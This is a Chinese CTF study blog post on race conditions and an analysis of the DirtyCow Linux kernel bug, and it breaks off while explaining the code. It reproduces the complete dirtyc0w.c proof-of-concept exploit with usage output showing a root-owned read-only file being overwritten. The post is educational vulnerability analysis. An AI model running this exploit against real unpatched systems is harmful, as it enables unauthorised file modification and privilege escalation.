---
title: 条件竞争学习 之 DirtyCow分析
date: 2019-11-18 00:00:00
categories:
- CTF/Pwn
tags: dirtycow
---

## 条件进制简介

[Race Condition](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/race-condition/introduction-zh/)

参考CTF Wiki：条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现bug。条件竞争的条件：

1. 并发
2. 共享对象
3. 改变对象

> 突然想到侧信道攻击的条件，不需要并发，不需要改变对象，只需要能读取到共享对象即可

## CTF Wiki中的练习

[构造例子](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/race-condition/problem-zh/)


跟着完成了一遍这个例子，总结一下就是利用条件竞争使得漏洞程序可以执行到一个可以栈溢出的漏洞函数，进而getshell。完成这里的例子测试中发现sleep不用0.000008，随便用个1，一样可以达到效果。不过我觉得这里的例子的情景说明的不是很清楚，仔细分析一下，这里的漏洞进程和攻击者进程都是我们自己运行起来的，其中：

- 受害者进程：循环启动./test fake的脚本进程
- 攻击者进程：循环拷贝和删除文件的脚本进程
- 共享资源是：fake文件

条件竞争中，分清进程和线程间的角色，是理解这种漏洞如何利用的关键。分析的目标是受害者进程，构造的是攻击者进程。因为条件竞争本身是一种时间维度上的漏洞，要求是并发，所以这两个进程需要拼命的循环，才可能巧合遇到攻击者进程控制的共享资源可以攻击到受害者进程。所以在CTF中，web中的条件竞争漏洞考察的次数比较多，因为可以通过访问不同页面达到启动两个不同的进程，通过快速多次访问两个不同的功能达到并发的条件。而在Pwn题目中，可以让选手操作一个可以循环的攻击者进程的情景不是很好操作，所以在Pwn中的条件竞争一般要放到线程中出题，便于构造漏洞。

如果想把这道题目作为一道CTF题目让选手做，可以把受害者进程循环启动起来，构造沙盒让选手可以上传攻击的二进制文件并且可以循环运行，但是不可以访问到flag或者让攻击者进程调试到受害者进程。

## DirtyCow分析

冬令营听了两遍DirtyCow还是不太懂，这次决定借着学习条件竞争的机会搞懂这个很出名的漏洞，首先通过学习总结一下这个漏洞的情景和原理：

利用DirtyCow漏洞可以任意修改文件系统中当前用户没有写权限的文件，即任意文件的写操作，从而使得攻击者从一个低权限的用户提升到一个高权限的用户。其中：

- 受害者线程：不断写内存的一个线程，这个内存区域是要更改的只读文件的内存映射
- 攻击者线程：不断通知操作系统，只读文件的内存映射的这片内存当前进程不再使用的一个线程
- 共享对象是：两个线程属于同一个进程，该进程的页表项是两个线程的共享对象

所以可见所谓的受害者线程，还是攻击者自己写的，那到底怎么个受害法呢？攻击者自己害自己？因为这里其实我们攻击的角色是操作系统，受害者线程里的写内存的代码是操作系统的系统调用。攻击者构造了两个线程，利用攻击者线程中系统调用代码，攻击受害者线程里的系统调用的代码，从而导致受害者线程中的系统调用的代码执行出错，修改了一个只读文件的内容。所以受害者其实是操作系统。

漏洞原理：

控制分配的页表的写意图标记位在某个时刻会被丢掉，如果这时利用一个线程清空页表，再次进行缺页处理时，则会把pagecache作为该页的物理地址，页表虽然没有标记可写，但是可以硬写。写入之后由于回写机制，会将修改返回真实文件。

> 最重要的是两个线程的操作：一个线程调用write(2)写/proc/self/mem，另一个线程调用madvice(MADV_DONTNEED)。由于这两个线程操作的相互竞争，当wirte(2)直接修改基于文件的内存映射时（即使涉及到的文件不允许被攻击者进程写）会产生一个安全问题，最终导致提权。

> 其实具体说可能有点绕，就是foll_write标志在row特性执行后去掉了，但是再次执行时却没有检查页表项的有效性，导致我们可以利用另一个线程清空页表。清空的页表由于没有了foll_write权限要求，再次被分配时就不执行row执行机制，导致原本不应该本写的地址拥有了写的权限。

这漏洞的PoC非常短，用法如下：

```c
/*
####################### dirtyc0w.c #######################
$ sudo -s
# echo this is not a test > foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -pthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
*/
```

PoC如下：

```c
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}

void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000;i++) {
    lseek(f,map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}

int main(int argc,char *argv[])
{
  if (argc<3)return 1;
  pthread_t pth1,pth2;
  f=open(argv[1],O_RDONLY);
  fstat(f,&st);
  name=argv[1];
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %x\n\n",map);
  pthread_create(&pth1,NULL,madviseThread,argv[1]);
  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
```

可见这个PoC的代码也非常简单易懂，需要了解linux的五个系统调用，可以通过man手册查询：

- open:  打开一个文件系统中的文件，返回文件描述符
- write: 向打开的文件描述符中，写相应的内容
- mmap:  通过文件描述符，将已经打开的文件映射到内存中
- lseek: 按照偏移更改文件描述符的指针
- madvise: 将自己的主动的控制内存的行为告知操作系统内核

PoC的行为如下：

首先main函数打开要修改的文件，并且以只读和私有方式映射到内存中（正常操作时用open方法打开的文件不会加载到用户态的内存中），然后启动两个线程